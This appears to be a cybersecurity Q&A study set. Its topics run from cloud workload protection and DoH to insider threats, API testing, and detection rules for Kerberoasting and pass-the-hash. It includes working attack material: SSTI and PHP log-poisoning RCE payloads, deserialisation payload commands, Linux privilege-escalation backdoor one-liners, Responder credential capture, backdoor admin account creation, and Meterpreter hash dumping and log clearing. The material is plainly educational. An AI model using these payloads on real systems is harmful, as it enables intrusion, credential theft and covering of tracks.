CWPP (Cloud Workload Protection Platform): security for cloud workloads (VMs, containers, serverless); runtime protection and compliance. Workload types protected: virtual machines (EC2, Azure VMs, GCP Compute Engine); containers (Docker, Kubernetes pods); serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions); microservices. Capabilities: vulnerability management: agent-based scanning on running workloads; identifies CVEs in OS and application packages; prioritisation based on exploitability and runtime context (is this vulnerability in a running process or dead code?); system hardening: CIS benchmark compliance checking; identify and remediate misconfigurations; drift detection (workload changed from last known good state). Runtime protection: behavioural monitoring: detect unusual behaviour at runtime (unexpected process, unusual file access, network connection); Falco (open-source, Kubernetes): rules engine for runtime security; detect: exec in container (kubectl exec or unexpected shell), sensitive file read (/etc/shadow, /etc/kubernetes/admin.conf), container escape attempt (mount system call, namespace creation); anti-malware: scan workload files for malware signatures; integrity monitoring: file integrity monitoring on critical files. Container-specific: image scanning pre-deployment (CI/CD integration); registry scanning (scan all images in ECR, ACR, GCR); Kubernetes admission control: OPA Gatekeeper, Kyverno: enforce policies before pod admission; prevent: running privileged containers, running as root, using latest tag, mounting host filesystem. Network security: east-west traffic visibility and control; workload-to-workload communication mapping; detect lateral movement between workloads. Products: Prisma Cloud (Palo Alto): comprehensive CWPP; CNApp (Cloud Native Application Protection Platform) combining CSPM, CWPP, CIEM; Wiz: agentless (read-only cloud API + memory snapshot scanning); no performance impact; Aqua Security: container-focused; strong Kubernetes; Sysdig: Falco-based; strong container runtime; Lacework: behavioural anomaly detection for cloud. Deployment: agent-based: Prisma Cloud Defender, Aqua Enforcer, Sysdig Agent installed on each workload; performance overhead; most complete visibility; agentless: cloud API based scanning; no performance impact; less real-time; coverage: all workloads not just where agent deployed.
What is DNS over HTTPS (DoH) and its security implications?

DoH (DNS over HTTPS): resolve DNS queries over encrypted HTTPS instead of unencrypted UDP/TCP port 53; improves privacy; complicates enterprise monitoring. Standard DNS problems: DNS queries sent plaintext over UDP port 53; ISP, network admin, government can see all DNS queries; DNS responses can be tampered (DNS spoofing without DNSSEC); firewall rules can easily block or redirect DNS. DoH: queries sent as HTTPS requests to DoH resolver: GET /dns-query?name=example.com&type=A HTTP/2; encrypted TLS; indistinguishable from normal HTTPS web traffic; resolvers: Cloudflare (1.1.1.1/dns-query), Google (8.8.8.8/dns-query), NextDNS, AdGuard; browser implementation: Firefox DoH: enabled by default in US (uses Cloudflare); Chrome: if system resolver supports DoH, uses DoH to same resolver; users can configure. DoT (DNS over TLS): similar goal; dedicated port 853; enterprise-friendly: easy to block or intercept port 853; less complex to implement on server side. Security benefits: prevents ISP snooping of DNS queries; prevents DNS hijacking on local network; prevents malicious DNS MITM; improves privacy on untrusted networks. Enterprise security implications: DNS filtering bypass: traditional security approach: redirect all DNS to corporate resolver; corporate resolver blocks malicious domains; blocks C2 domains; with DoH direct to Cloudflare: bypasses corporate resolver; malware can use DoH to reach C2 (DoH C2 increasingly common); enterprise detection gap: DNS sinkholing and filtering bypassed; security teams lose visibility into DNS queries. Enterprise controls: block DoH at network level: block outbound port 443 to known DoH resolver IPs (Cloudflare 1.1.1.1, Google 8.8.8.8); block DoH hostnames via proxy (dns.cloudflare.com, dns.google); force managed browsers to use corporate DoH server: Firefox enterprise policy: DoH with corporate resolver; Chrome: DoHRolloutMode enterprise policy; monitor: encrypted DNS traffic identification is challenging; Cloudflare Gateway, NextDNS Business: provide DoH endpoint for enterprises with full logging; route all DoH through corporate DoH server (maintains visibility while providing encryption). DNSSEC vs DoH: DNSSEC: validates DNS response integrity (cryptographic signature by zone owner); prevents DNS spoofing; not private; DoH: private; does not validate integrity (trust DoH resolver); both needed for full DNS security.
How do you detect and investigate insider threats?

Insider threat: employee, contractor, or partner misuses authorised access to harm organisation; intentional (malicious) or unintentional (negligent). Categories: Malicious insiders: theft of IP (engineering leaving to join competitor; downloads all designs before resignation); sabotage (disgruntled employee deletes databases); fraud (finance employee manipulates transactions); espionage (nation-state planted employee); negligent insiders: accidental data sharing (sends wrong attachment to external email); falls for phishing; improper data handling; compromised insiders: attacker uses legitimate employee account (credentials compromised; account taken over). Indicators: behavioural: sudden changed behaviour; expressing dissatisfaction; financial stress (may indicate susceptibility to bribery); planning departure; IT indicators: downloading large volumes of data; accessing resources outside normal role; after-hours access; accessing HR, financial, or executive data without business need; using personal cloud storage (Google Drive, Dropbox) from work network; forwarding email to personal account; printing sensitive documents; access to areas not needed; departing employee: spike in file downloads; access to colleagues files; mass deletion. Detection technologies: UEBA (User and Entity Behaviour Analytics): baseline normal activity; alert on deviations; detect: unusual file access volume, unusual download volume, unusual hour access, unusual location access; products: Exabeam, Splunk UEBA, Microsoft Sentinel UEBA, Securonix; DLP (Data Loss Prevention): monitor data leaving organisation; email, USB, cloud upload, print; alert on sensitive data exfiltration attempts; network monitoring: NetFlow, proxy logs: large data transfers to personal cloud; unusual email forwarding; privileged access monitoring: PAM (Privileged Access Management) solutions monitor and record admin actions; session recording of privileged access. Programme structure: multi-disciplinary team: HR, Legal, Security, IT, management; privacy considerations: inform employees of monitoring (privacy laws vary; employment contracts); proportionate monitoring; alert triage: investigate as security incident; document carefully; HR and Legal involved before confronting; evidence preservation for potential legal action. Prevention: clear policies (acceptable use, data handling); security awareness training; prompt offboarding (revoke access immediately on departure); access reviews (remove unnecessary access); exit interviews; segregation of duties for high-risk roles.
What is exploit chaining in web application security?

Exploit chaining: combine multiple individually low-severity vulnerabilities into a high-severity attack path; demonstrate real-world impact. Why chain vulnerabilities: single vulnerability may be low severity (CVSS 3.0); combination creates critical impact; demonstrates to stakeholders that medium findings are not ignorable; shows realistic attacker path. Common chains: SSRF to internal metadata: SSRF (Low-Medium on its own: server makes requests to internal URLs); chain with cloud metadata endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE; retrieve IAM credentials; AWS account takeover; impact: Critical. XSS to account takeover: Reflected XSS (Medium on its own); chain with: steal session cookie (if not HttpOnly); or steal CSRF token (if HttpOnly but token in DOM); forge authenticated request; account takeover; or combine with self-XSS + CSRF to execute XSS in victim context (if self-XSS reflected via CSRF-controlled form). IDOR to privilege escalation: IDOR in user object (Low: attacker sees other user profile); combined with: user role stored in same API response; API accepts role modification via PATCH; IDOR to read admin user details + modify own account to grant admin role; privilege escalation. Open redirect to phishing: open redirect (Informational on its own); combined with: OAuth flow (redirect_uri uses open redirect; steals OAuth code; account takeover); or: email phishing link appears legitimate (legitimate domain redirects to phishing page); SSRF + open redirect: blind SSRF needs target URL; open redirect on trusted domain allows SSRF bypass. LFI to RCE chain: LFI (Local File Inclusion) reads files; poison log file (Apache access log: GET /<?php system($_GET[cmd]); ?> HTTP/1.1 -- log written with PHP code); include log file via LFI with cmd parameter; LFI to RCE via log poisoning. Documentation: each link in chain: vulnerability name, severity, CVSS; how it chains to next step; final impact and CVSS; reproduce each step individually then as chain; suggest remediation for each link (fixing any link breaks the chain).
How do you assess API security?

API security testing: assess REST, GraphQL, gRPC, and SOAP APIs for vulnerabilities. Reconnaissance: discover API endpoints: OpenAPI/Swagger spec (check /swagger-ui.html, /openapi.json, /api-docs, /v2/api-docs); Postman collections in GitHub; JavaScript files (search for fetch calls, axios, XMLHttpRequest); API gateway documentation; Burp proxy while using application (capture all API calls); API versioning: test old versions (/api/v1/ while current is /v2/); old versions may lack security controls. OWASP API Top 10 (2023): API1: BOLA (Broken Object Level Authorisation) = IDOR in APIs: access other users objects by changing ID; API2: Broken Authentication: weak or missing auth; API tokens in URLs; long-lived tokens; API3: Broken Object Property Level Authorisation: mass assignment (send extra properties not in UI; accepted and stored); over-exposure (API returns more fields than UI shows); API4: Unrestricted Resource Consumption: missing rate limiting; resource-intensive operations (search, export) unthrottled; API5: Broken Function Level Authorisation: admin functions accessible by regular users; HTTP method differences; API6: Unrestricted Access to Sensitive Business Flows: no anti-automation (buy limited edition items en masse, spam referral); API7: Server-Side Request Forgery: URL parameter fetches remote resource; API8: Security Misconfiguration: CORS misconfiguration, verbose errors, default credentials; API9: Improper Inventory Management: shadow APIs, old API versions, test endpoints in production; API10: Unsafe Consumption of APIs: trust third-party API responses without validation. Testing methodology: auth testing: test without token (401?), expired token (401?), other user token (403?), admin endpoint with user token (403?), token in different parameter location (header vs query string vs body); input testing: inject in all parameters: SQL injection, command injection, SSTI, SSRF, path traversal; mass assignment: send extra fields (role, admin, isAdmin, status) in update requests; rate limiting: run 100 requests quickly; measure if throttled; BOLA: change ID in URL/body to access other user resources; response filtering: compare responses across different user roles; same endpoint returns different data for admin vs user?. Tools: Postman (API testing); Burp Suite (proxy and scanner); mitmproxy; OWASP ZAP; 42Crunch (OpenAPI spec security audit); Arjun (find hidden API parameters).
What are common Linux privilege escalation techniques?

Linux privilege escalation: escalate from low-privilege user to root or higher privilege account. Enumeration first: LinPEAS (automated enum: downloads and runs on target; outputs colour-coded findings; check yellow/red); Linux Exploit Suggester 2; manual commands below. SUID binaries: find / -perm -u=s -type f 2>/dev/null; check GTFOBins (gtfobins.github.io): each binary: can it be used for privilege escalation via its SUID status?; examples: /usr/bin/find with SUID: find. -exec /bin/sh -p \; -quit (shell as root); /bin/bash with SUID: bash -p (runs as SUID owner root); /usr/bin/python with SUID: python -c import os; os.setuid(0); os.system(/bin/bash). Sudo misconfigurations: sudo -l (what can current user run as sudo?); NOPASSWD entries: run without password; any binary in GTFOBins: (ALL) NOPASSWD: /usr/bin/vim --> sudo vim -c :!sh; (ALL) NOPASSWD: /usr/bin/python3 --> sudo python3 -c import os; os.system(/bin/bash). Writable cron jobs: cat /etc/crontab; ls /etc/cron.* -la; is any script run by cron writable by current user?; modify script to add backdoor or SUID bash: echo cp /bin/bash /tmp/b && chmod +s /tmp/b >> /etc/cron-script.sh. Kernel exploits: uname -r (kernel version); searchsploit linux kernel VERSION; Linux Exploit Suggester matches kernel version to known exploits; dirty cow (CVE-2016-5195): race condition; worked on most kernels < 4.8.3; example of critical kernel PrivEsc; modern kernels more hardened; container escape: check if in container (ls /.dockerenv, cat /proc/1/cgroup); if privileged container: mount host filesystem; read host files as root; escape via nsenter if allowed. Path injection: echo $PATH; if writable directory in PATH before /bin: place malicious binary named same as commonly run command (ls, id, etc.) in writable path directory; run as root via cron or sudo: malicious binary executes. Wildcard injection: cron runs: tar czf /backup.tar.gz /data/*; wildcard expanded by shell; attacker creates files: --checkpoint=1 --checkpoint-action=exec=sh shell.sh; tar expands wildcard including flag filenames; executes shell as root. Weak file permissions: cat /etc/shadow readable (unshadowed passwords; crack with hashcat); /etc/passwd writable (add root-level user); sensitive files (SSH keys, creds) readable.
What is Terraform security and infrastructure as code security?

IaC (Infrastructure as Code) security: treat infrastructure configuration as security-tested code; prevent misconfigurations before deployment. Why IaC security matters: same misconfiguration deployed across all environments at scale; public S3 bucket in Terraform module deployed to every account using that module; misconfiguration in version control = historical record of security mistake; catch before apply rather than detect and remediate after. Terraform security tools: Checkov (Bridgecrew, Palo Alto): static analysis of Terraform, CloudFormation, Kubernetes, Dockerfile; CIS benchmark rules for cloud resources; integrates into CI/CD (GitHub Actions, Jenkins); free and open-source; example finding: CKV_AWS_18 (Ensure the S3 bucket has access logging enabled), CKV_AWS_19 (Ensure all data stored in the S3 bucket is encrypted); tfsec: fast, open-source Terraform scanner; similar checks to Checkov; KICS (Keeping Infrastructure as Code Secure, Checkmarx): supports 20+ IaC formats; Terrascan: runs IaC through policy-as-code (OPA); Snyk IaC: commercial; developer-friendly output; fixes suggested in IDE; cost estimate integration. Common Terraform security findings: S3 bucket: public access not blocked (aws_s3_bucket_public_access_block missing); versioning disabled; logging disabled; encryption disabled; Security group: ingress from 0.0.0.0/0 on port 22 or 3389; all traffic allowed; RDS: publicly accessible=true; encryption at rest disabled; deletion protection disabled; IAM: wildcard permissions; managed policy with * Action; EC2: IMDSv2 not required (metadata_options.http_tokens = optional vs required); public IP assigned; KMS: rotation disabled; CloudTrail: not all regions; not logging all events; no integrity validation. Secure coding patterns: use data sources for existing resources (not hardcode IDs); use variables with validation; mark sensitive outputs as sensitive = true; state file security (contains secrets; encrypt state backend: S3 with KMS; DynamoDB lock; restrict access to state). Policy as code: Sentinel (Terraform Cloud/Enterprise): enforce guardrails before apply; example: no internet-accessible RDS; OPA with Terraform plan JSON: evaluate plan before apply; Conftest: test config files with OPA policies.
What is a zero-day vulnerability?

Zero-day (0-day): vulnerability unknown to software vendor or without available patch; exploits exist before defence is possible. Zero-day vs N-day: zero-day: no patch, no public knowledge (at time of exploitation); n-day: vulnerability disclosed (CVE published) but not yet patched by target (attacker exploits known vulnerability against unpatched systems; most attacks are n-day not zero-day). Why zero-days are valuable: defenders cannot patch what they do not know exists; no signatures in AV/IDS/SIEM; technical controls cannot block; attacker has complete offensive advantage; market price: iOS full chain: $2.5M (Zerodium 2023 price list); Windows LPE: $400K; Chrome renderer RCE: $500K; government programmes pay similar amounts. Zero-day lifecycle: discovery: researcher or attacker finds vulnerability; vendor-unknown period: vulnerability used for attacks; can last months to years; disclosure: vendor learns (via coordinated disclosure, security researcher, or intelligence); patch development: 1-90 days depending on severity; patch release: public availability; deployment: organisations patch (varies weeks to months); defender window: after patch release but before deployment = n-day window. Types by discoverer/holder: nation-state zero-days: NSA, GCHQ, FSB, MSS, DPRK: stockpile for intelligence and cyber warfare; EternalBlue: NSA zero-day (MS17-010); leaked by Shadow Brokers; used in WannaCry and NotPetya; broker market: Zerodium, Crowdfense purchase from researchers; sell to government customers; criminal ecosystem: underground markets sell 0-days for criminal use (banking trojans, ransomware); vendor bug bounty: researchers report to vendor for bounty (legitimate path). Famous zero-days: Stuxnet (2010): used 4 zero-days simultaneously against Iranian nuclear programme; Operation Aurora (2010): IE zero-day targeting Google and 20+ companies; HAFNIUM Exchange (2021): 4 zero-days in Exchange Server; Log4Shell (2021): technically zero-day when disclosed (some debate); SolarWinds SUNBURST. Defence against zero-days: defence in depth (compromise of one control does not equal full breach); EDR with behavioural detection (detect exploitation behaviour even without signature); network segmentation (limits blast radius); threat hunting; application whitelisting; patch speed (shorten n-day window); vulnerability disclosure programme (find before attackers).
What is the OSI model and how does it apply to cybersecurity?

OSI (Open Systems Interconnection) model: conceptual framework for network communication; 7 layers from physical to application; attacks and defences mapped to specific layers. Layer 1 - Physical: cables, wireless signals, hardware; attacks: physical access to network hardware, wiretapping copper, optical splitter on fibre, rogue access points (hardware layer); defence: physical security, cable enclosures, tamper detection. Layer 2 - Data Link: MAC addresses, Ethernet frames, switches, VLANs; attacks: ARP spoofing (manipulate ARP tables), MAC flooding (fill switch MAC table, fallback to hub mode, sniff all traffic), VLAN hopping (double tagging), STP manipulation (BPDU attacks); defence: dynamic ARP inspection, port security, VLAN ACLs, BPDU guard. Layer 3 - Network: IP addresses, routing, routers; attacks: IP spoofing, ICMP attacks (ping of death, smurf attack), routing protocol attacks (RIP/OSPF injection), BGP hijacking; defence: ingress/egress filtering, IPsec, RPKI for BGP. Layer 4 - Transport: TCP/UDP, ports, connection establishment; attacks: SYN flood (half-open connections exhaust resources), TCP session hijacking (predict sequence numbers), UDP flood; defence: SYN cookies, rate limiting, stateful firewalls (track connection state). Layer 5 - Session: session management, authentication, remote procedure calls; attacks: session hijacking, Kerberos attacks (golden ticket, pass-the-ticket), SMB session attacks; defence: session encryption, MFA, session timeout. Layer 6 - Presentation: data formatting, encryption, encoding; attacks: SSL stripping (downgrade HTTPS to HTTP), TLS vulnerabilities, encoding attacks (input validation bypass via encoding); defence: TLS 1.2/1.3 only, HSTS, certificate pinning. Layer 7 - Application: HTTP, DNS, SMTP, application protocols; attacks: all application vulnerabilities (SQLi, XSS, SSRF, business logic flaws), DDoS targeting application layer, DNS attacks, email spoofing; defence: WAF, secure coding, input validation, application hardening. Practical use: when troubleshooting: start at layer 1 (is the cable plugged in?) and work up; when designing security: consider controls at each layer; in pentesting: attacks at each layer; layered defence addresses threats at each OSI layer.
How do you exploit SSTI (Server-Side Template Injection)?

SSTI occurs when user input is embedded in a server-side template without sanitisation. Detection: inject {{7*7}}; if response shows 49, Jinja2/Twig/Pebble SSTI confirmed; ${7*7} for FreeMarker; #{7*7} for Thymeleaf. Jinja2 exploitation: access global objects via __class__, __mro__, __subclasses__(): {{request.__class__.__mro__[1].__subclasses__()}} enumerates all Python classes; find subprocess.Popen or os.system; RCE: {{request|attr(request.args.a)|attr(request.args.b)(request.args.c)}} with URL params to bypass WAF. Twig (PHP): {{_self.env.registerUndefinedFilterCallback(system)}}{{_self.env.getFilter(id)}} executes id. FreeMarker: <#assign ex=freemarker.template.utility.Execute?new()>${ex(id)}. ERB (Ruby): <%=`id`%>. Impact: full RCE on the server; read /etc/passwd, environment variables (credentials), source code; reverse shell. Prevention: never pass user input directly to template render functions; use sandboxed template environments; validate and escape inputs before template context.
Explain GraphQL security vulnerabilities and how to test for them.

GraphQL security issues: (1) Introspection enabled in production -- query __schema to enumerate all types, queries, mutations, fields; attackers map entire API surface: {__schema{types{name fields{name type{name}}}}}; disable introspection in production or restrict to authenticated admins. (2) Batching attacks -- GraphQL allows sending array of queries in one request; used for credential stuffing/brute force without per-request rate limiting; 100 login mutations in one HTTP request. (3) Deeply nested queries -- recursive/circular types allow exponential query depth: query { user { friends { friends { friends {... }}}}}; DoS via depth; implement depth limiting (default: 7 levels) and query complexity analysis. (4) Mass assignment/over-fetching -- mutations accept fields that should not be user-controlled (role, verified, balance); always validate exactly which fields a user can set. (5) IDOR via global IDs -- change node ID in query to access other users data. (6) Injection -- if resolvers construct raw SQL or MongoDB queries from field arguments: query { user(name: admin union select...) }; use parameterised queries in resolvers. Testing tools: Altair GraphQL Client; InQL (Burp extension) -- auto-introspects and generates test cases; clairvoyance (wordlist-based field enumeration without introspection); graphql-cop for common security issues.
How do you exploit deserialization vulnerabilities?

Insecure deserialisation occurs when untrusted data is deserialised, allowing attackers to manipulate object state or trigger code execution. Java: ObjectInputStream.readObject() is the primary sink; gadget chains (collections of existing classes) achieve RCE; tools: ysoserial generates payloads for known gadget chains (CommonsCollections, Spring, Groovy): java -jar ysoserial.jar CommonsCollections4 whoami | base64; send as serialised Java object (identifies by magic bytes AC ED 00 05); popular libraries with gadgets: Apache Commons Collections, Spring, XStream. Python pickle: pickle.loads() of untrusted data executes arbitrary code; payload: import pickle; class Exploit(object): def __reduce__(self): return (os.system, (reverse_shell_cmd,)); pickle.dumps(Exploit()); safe alternative: use JSON. PHP unserialise(): magic methods __wakeup() and __destruct() called automatically; POP chains (Property Oriented Programming) chain class methods; phpggc generates PHP gadget chains..NET BinaryFormatter: deprecated in.NET 5+ due to security; ViewState if not properly validated and encrypted; ysoserial.net for payloads. Detection: look for base64-encoded data starting with rO0 (AC ED Java), AAEAAAD (.NET), serialised Cookie/session values, Java content-type application/x-java-serialized-object. Prevention: avoid deserialising untrusted data; if unavoidable, use integrity checks (HMAC) before deserialising; use allowlists of acceptable classes.
What is clickjacking and how do you prevent it?

Clickjacking (UI Redressing): attacker embeds target site in a transparent iframe over their malicious page; victim thinks they are clicking on attacker page but actually clicking on hidden target site (Like button, transfer funds, change email). Attack: attacker page CSS: iframe {opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%}; victim clicks invisible iframe button. Consequences: force social media likes, unauthorised actions, one-click attacks on pre-authenticated users. Defense: (1) X-Frame-Options header: DENY (no framing); SAMEORIGIN (only same site can frame); ALLOW-FROM uri (deprecated); most effective and simple. (2) Content-Security-Policy frame-ancestors directive (modern, more flexible): frame-ancestors none; frame-ancestors self; frame-ancestors trusted.com; CSP frame-ancestors overrides X-Frame-Options in modern browsers. (3) Frame-busting JavaScript (legacy, easily bypassed): if (top !== self) { top.location = self.location; } -- bypassed by sandbox attribute on iframe: sandbox=allow-scripts (prevents top-level navigation). Effective defense: always set both X-Frame-Options: DENY and Content-Security-Policy: frame-ancestors none for applications where framing is never needed.
How do you perform port scanning and service enumeration?

Port scanning methodology: (1) TCP SYN scan (most common): nmap -sS -p- --open -T4 TARGET -- half-open scan; fast and stealthy (no full TCP connection); requires root. (2) TCP connect scan (no root required): nmap -sT -p 1-65535 TARGET. (3) UDP scan: nmap -sU --top-ports 1000 TARGET -- slow, unreliable; important services: 53 DNS, 161 SNMP, 69 TFTP, 123 NTP, 500 ISAKMP. (4) Masscan for speed: masscan -p1-65535 --rate=50000 TARGET -- fast initial discovery; follow with nmap for service details. (5) Service version detection: nmap -sV --version-intensity 9 TARGET. (6) Script scanning: nmap -sC runs default NSE scripts (service enum, vuln detection); nmap --script=smb-vuln-ms17-010 (specific script). Interpreting results: 22/tcp open ssh OpenSSH 8.2p1 -- check version against CVEs; 80/tcp open http Apache httpd 2.4.29 -- check for CVEs, run web scanner; 3306/tcp open mysql -- test for remote login, default creds; 5900/tcp open vnc -- VNC password bruteforce; 27017/tcp open mongodb -- check if auth required; 2375/tcp open docker -- Docker API unauthenticated = instant SYSTEM. NSE scripts for enumeration: smb-enum-shares, smb-enum-users, smtp-enum-users, ftp-anon (anonymous FTP), ssl-cert (certificate info), http-title, http-methods.
How do you perform OSINT on a domain to map its attack surface?

Domain OSINT attack surface mapping: (1) DNS enumeration: dig ANY target.com; dnsx -d target.com -a -aaaa -mx -ns -txt -resp; host -t mx target.com; MX reveals email provider; NS reveals registrar; TXT reveals SPF (authorised senders), DMARC policy, third-party verifications (Google, Microsoft). (2) Subdomain discovery: amass enum -passive -d target.com (40+ sources); subfinder -d target.com (80+ sources); crt.sh Certificate Transparency: curl https://crt.sh/?q=%.target.com&output=json | jq.[].name_value | sort -u; SecurityTrails API for historical DNS. (3) Web technology: whatweb target.com (tech fingerprinting); wafw00f target.com (WAF detection); nikto -h target.com (basic vuln scan). (4) Port scanning: masscan on all discovered IPs; nmap service detection on open ports. (5) S3/cloud asset discovery: awsbucketdump for open S3 buckets; GrayhatWarfare.com for public buckets matching company name. (6) Email security posture: check SPF, DKIM, DMARC; MXToolbox blacklist check; HaveIBeenPwned domain search for breached employee emails. (7) GitHub dorking: org:targetorg password OR secret OR api_key -- search repos for leaked credentials. (8) Shodan: org:Target Corp -- exposed services, versions, banners. Output: asset inventory (IPs, domains, web apps, cloud assets), technology stack, email security posture, exposed services.
Explain how to use Responder for credential capture on a network.

Responder is a LLMNR/NBT-NS/MDNS poisoner that captures NTLMv1/v2 hashes on local networks. Background: when a Windows machine tries to resolve a hostname that does not exist in DNS, it falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) which broadcast on local subnet; Responder responds to these broadcasts claiming to be the requested host; victim connects to attacker for SMB/HTTP/etc; attacker captures NTLMv2 hash. Setup: apt install responder; edit Responder.conf (if NTLM relay planned, disable SMB and HTTP in config); run: python3 Responder.py -I eth0 -wdv (w=WPAD, d=DHCP DNS spoofing, v=verbose). Captured hashes: stored in /usr/share/responder/logs/ as Responder-Session.log and per-protocol files; format: NTLMv2-SSP hashes for hashcat -m 5600. Cracking: hashcat -m 5600 hashes.txt rockyou.txt --rules /usr/share/hashcat/rules/best64.rule. WPAD abuse (-w flag): Windows proxies auto-discover proxy via WPAD; Responder serves malicious WPAD script forcing authentication; captures credentials from browsers without any user interaction. Active attack combination: run Responder (capture) simultaneously with ntlmrelayx (relay) for maximum impact; configure Responder with SMB=Off HTTP=Off; ntlmrelayx relays incoming auth to target systems.
How do you conduct an internal network pentest after gaining initial access?

Internal network pentest post-initial-access: (1) Situational awareness: whoami; hostname; ipconfig/ip addr; arp -a (local ARP table = nearby hosts); net use / mount (mapped drives); route print. (2) Subnet discovery: ping sweep with fping -a -g 10.0.0.0/24 or nmap -sn 10.0.0.0/24 or for /L %i in (1,1,254) do @ping -n 1 10.0.0.%i | find TTL. (3) Port scan internal: nmap -sT -p 22,80,443,445,3389,5985,8080 --open 10.0.0.0/24 (TCP connect, no root needed on Windows). (4) Service exploitation: SMB (445): attempt null session (smbclient -N -L //host); test for EternalBlue (nmap --script smb-vuln-ms17-010); check signing (no signing = relay possible). RDP (3389): check BlueKeep (CVE-2019-0708). WinRM (5985): evil-winrm -i host -u user -p pass. (5) AD enumeration: if domain joined: net user /domain; net group Domain Admins /domain; PowerView: Get-DomainUser; BloodHound SharpHound collection. (6) Lateral movement: PsExec: psexec.py domain/user:pass@host cmd.exe; WMI: wmiexec.py domain/user:pass@host; CrackMapExec: cme smb 10.0.0.0/24 -u user -p pass --local-auth. (7) Persistence: scheduled task; registry run key; new admin user: net user hacker P@ssw0rd123 /add; net localgroup administrators hacker /add. (8) Pivoting: upload chisel or ligolo-ng; establish tunnel from compromised host to attack machine; access previously unreachable network segments.
What is Metasploit Meterpreter and how do you use it post-exploitation?

Meterpreter is an advanced post-exploitation payload that runs entirely in memory, communicates over encrypted channel, and provides rich post-exploitation capabilities. Key commands: Core: sysinfo (system details); getuid (current user); getsystem (attempt privilege escalation -- tries named pipe impersonation, token duplication); getpid; ps (list processes); migrate PID (move to more stable process -- explorer.exe or svchost.exe). Files: upload /path/to/file C:/Windows/Temp/; download C:/Users/user/secret.docx./; ls; cat; edit file. Networking: ipconfig; arp; portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_HOST (TCP port forward through Meterpreter -- pivot to internal services); route add SUBNET MASK SESSION_ID (add route for pivoting). Credentials: hashdump (dump SAM database -- requires SYSTEM); run post/windows/gather/credentials/credential_collector; run post/windows/gather/smart_hashdump. Stealth: clearev (clear application/system/security event logs); timestomp file.exe -m 01/01/2020 (modify timestamp to blend in). Background: background (put session in background); sessions -l (list); sessions -i 1 (interact with session 1). Post modules: run post/multi/recon/local_exploit_suggester; run post/windows/manage/enable_rdp; run post/windows/gather/dumplinks (recent documents). Pivoting: use auxiliary/server/socks_proxy; set SRVPORT 1080; run; then proxychains nmap -sT target.
How do you build a detection rule for Kerberoasting in a SIEM?

Kerberoasting detection in a SIEM using Windows Security Events: Primary indicator: Event ID 4769 (Kerberos Service Ticket Requested) with encryption type 0x17 (RC4-HMAC) from user accounts (not computer accounts). Detection logic in Splunk SPL: index=windows EventCode=4769 Ticket_Encryption_Type=0x17 NOT Account_Name=*$ | stats count by Account_Name, Service_Name, Client_Address | where count > 3 | sort -count. Explanation: 0x17 = RC4 encryption -- modern AD uses AES (0x12 or 0x11); RC4 TGS request is anomalous; computer accounts (ending in $) generate legitimate RC4 requests; spike in RC4 TGS requests from a single source is highly suspicious. Tune for FPs: exclude known service accounts that legitimately use RC4 (legacy applications); exclude monitoring tools that request service tickets. Additional signals: Event 4769 spike from one source IP across many service accounts in a short time window; timing correlation with penetration testing tools (Rubeus, GetUserSPNs). Sigma rule: logsource category: windows, service: security; detection: selection: EventID: 4769; TicketEncryptionType: '0x17'; filter: AccountName|endswith: '$'; condition: selection and not filter; level: high. Hardening response: set msDS-SupportedEncryptionTypes=24 on service accounts (forces AES-only -- no RC4 TGS issued); convert to gMSA (Group Managed Service Accounts -- 120-char random passwords, uncrackable in reasonable time).
Explain how to detect and respond to a pass-the-hash attack.

Pass-the-Hash (PtH) detection is challenging because legitimate NTLM authentication looks the same as hash-based authentication. Detection indicators: (1) Type 3 logon (network logon) with NTLM authentication from unexpected source -- Event ID 4624 Logon Type 3 Package=NTLM, Workstation_Name different from typical source. (2) Admin share access (IPC$, C$, ADMIN$) from workstations (not from servers/DC) -- Event 4624 + 5140 (network share access) from a workstation IP. (3) Lateral movement pattern -- same user authenticating to multiple hosts within short time window. (4) CrackMapExec signature in event logs -- network logon with unusual process name or from unexpected source. SIEM detection SPL: index=windows EventCode=4624 Logon_Type=3 Authentication_Package=NTLM | stats dc(Computer) as unique_hosts count by Account_Name Source_Network_Address | where unique_hosts > 3. Hardening to prevent: (1) Enable Protected Users security group for all privileged accounts -- prevents NTLM authentication for members. (2) Credential Guard -- VBS-isolated LSASS prevents hash extraction. (3) Enable Restricted Admin mode for RDP -- prevents credential caching. (4) Implement LAPS -- unique local admin passwords per machine; PtH does not spread laterally. (5) Network segmentation -- prevent workstation-to-workstation SMB (block TCP 445 between workstations at firewall level). (6) Privileged Access Workstations -- admin accounts only used from dedicated PAWs.
How do you implement security monitoring for cloud environments (AWS)?

AWS security monitoring architecture: (1) CloudTrail -- logs all API calls (management plane); enable in all regions; log to S3 with integrity validation; enable CloudTrail Insights (anomaly detection for unusual API activity). (2) VPC Flow Logs -- network-level visibility; logs source/destination IP, port, protocol, bytes, action (ACCEPT/REJECT); detect port scanning, unexpected connections, data exfiltration. (3) DNS Query Logs (Route 53 Resolver) -- all DNS lookups from VPC; detect DGA domains, C2 communication, data exfiltration over DNS. (4) GuardDuty -- managed threat detection service; analyses CloudTrail, VPC Flow Logs, DNS logs; detects: cryptocurrency mining, compromised credentials (unusual API calls from Tor), EC2 instance communicating with known C2, account reconnaissance, S3 data exfiltration. (5) Security Hub -- aggregates findings from GuardDuty, Macie, Inspector, IAM Access Analyser, Config; CSPM (Cloud Security Posture Management). (6) Config -- continuous configuration compliance; detect misconfigurations (S3 bucket public, security group open to 0.0.0.0/0, no MFA on root, unencrypted EBS volumes); Config rules with auto-remediation Lambda. (7) Macie -- ML-based sensitive data discovery in S3 (PII, credentials, financial data). SIEM integration: ship CloudTrail to Splunk or Elastic via S3+Lambda or Kinesis Firehose; parse and correlate; alert on GuardDuty findings. Detection priorities: root account usage (alert immediately), new IAM user/key creation, public S3 bucket creation, security group 0.0.0.0/0 on port 22/3389.
What are the key indicators of compromise (IOCs) to hunt for after a breach?

